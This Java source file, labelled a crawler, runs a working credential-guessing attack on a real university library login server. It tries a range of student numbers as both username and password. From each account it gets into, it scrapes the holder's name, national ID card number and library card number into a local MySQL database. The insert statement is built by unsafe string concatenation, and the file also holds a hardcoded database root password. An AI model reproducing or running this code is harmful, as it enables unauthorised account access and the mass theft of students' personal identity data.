import java.io.*;
import java.net.*;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.Statement;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Lab {
    public static void main(String[] args) throws IOException {
        System.out.println("启动爬虫");
        Lab lab = new Lab();
        lab.init();

    }

    public void init() {
        new LabThread(2012010000,2012020000);
    }

}

class LabThread implements Runnable {

    int start = 0;
    int end = 0;

    public LabThread(int start, int end) {
        this.start = start;
        this.end = end;
        new Thread(this).start();
    }

    public void run() {
        String url = "http://211.70.171.1/list/dzjs/login.asp";

        String urlnext = "http://211.70.171.1/list/dzjs/login_form.asp";

        String charset = "UTF-8";

        DB db = new DB();

        int sum = 0;

        long t = System.currentTimeMillis();

        for(long i = start; i <= end; i++) {

            String param = Long.toString(i);

            String query = null;
            try {
                query = String.format("user=%s&pw=%s", URLEncoder.encode(param, charset), URLEncoder.encode(param, charset));
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }

            CookieHandler.setDefault(new CookieManager(null, CookiePolicy.ACCEPT_ALL));


            URLConnection connection = null;
            try {
                connection = new URL(url + "?" + query).openConnection();
            } catch (IOException e) {
                e.printStackTrace();
            }

            BufferedReader buf = null;
            try {
                buf = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            } catch (IOException e) {
                e.printStackTrace();
            }
            String line = null;

            String warn = "错误";
            Pattern warnP = Pattern.compile(warn);


            int warni = 0;
            try {
                while ((line = buf.readLine()) != null) {
                    Matcher w = warnP.matcher(line);
                    if(w.find())
                        warni ++;
                }
            } catch (IOException e) {
                e.printStackTrace();
            }

            if(warni == 1) {
                System.out.println("处理" + i + "\t");
                continue;
            }

            System.out.print("处理" + i + "\t");

            List<String> cookies = connection.getHeaderFields().get("Set-Cookie");

            try {
                connection = new URL(urlnext).openConnection();
            } catch (IOException e) {
                e.printStackTrace();
            }

            BufferedReader bufr = null;
            try {
                bufr = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            } catch (IOException e) {
                e.printStackTrace();
            }

            //String line = null;

            String Idcard = "\\d{17}\\S";
            String name = "【(\\S+)】";
            String libnum = "\\s(\\d{8,10})\\b";

            Pattern IdcardP = Pattern.compile(Idcard);
            Pattern nameP = Pattern.compile(name);
            Pattern libnumP = Pattern.compile(libnum);

            String IdcardD = null;
            String nameD = null;
            String libnumD = null;

            int cardflag = 0;
            int exist = 0;

            try {
                while ((line = bufr.readLine()) != null) {
                    //System.out.println(line);

                    Matcher m = IdcardP.matcher(line);
                    if (m.find()) {
                        System.out.print("身份证" + m.group());
                        IdcardD = m.group();
                        exist ++;
                    }

                    Matcher n = nameP.matcher(line);
                    if (n.find()) {
                        System.out.print("学号" + i + "\t" + "姓名" + n.group(1) +"\t");
                        nameD = n.group(1);
                        exist ++;
                    }

                    Matcher j = libnumP.matcher(line);
                    if(j.find()) {
                        if(cardflag == 1) {
                            libnumD = j.group(1);
                            System.out.print("\t" + "卡号" + libnumD + "\t");
                        }
                        cardflag ++;
                        exist ++;
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
            if(exist >= 2) {
                System.out.print("有效" + sum++);
                db.insert(i, nameD, libnumD, IdcardD);
            }
        }
    }

}

class DB {

    static final String DB_URL = "jdbc:mysql://localhost:3306/Lib?useUnicode=true&characterEncoding=UTF-8";

    //set database username password
    static final String USER = "root";
    static final String PASS = "123456";

    Connection conn = null;
    Statement stmt = null;

    //insert data
    public synchronized void insert(long data1, String data2, String data3, String data4) {

        try{
            //Register JDBC driver, maybe userful
            //Class.forName("com.mysql.jdbc.Driver");

            //Open a connection
            conn = DriverManager.getConnection(DB_URL, USER, PASS);

            //Execute a query
            stmt = conn.createStatement();

            String sql = "INSERT INTO lib_copy " +
                    "VALUES (" + data1 +",'"+ data2+"'," + data3 +",'"+data4+"')";

            stmt.executeUpdate(sql);
            System.out.println("\t" + "数据库插入成功");

            conn.close();
            stmt.close();

        }
        catch(Exception e){
            //Handle errors for Class.forName
            e.printStackTrace();
        }
    }
}



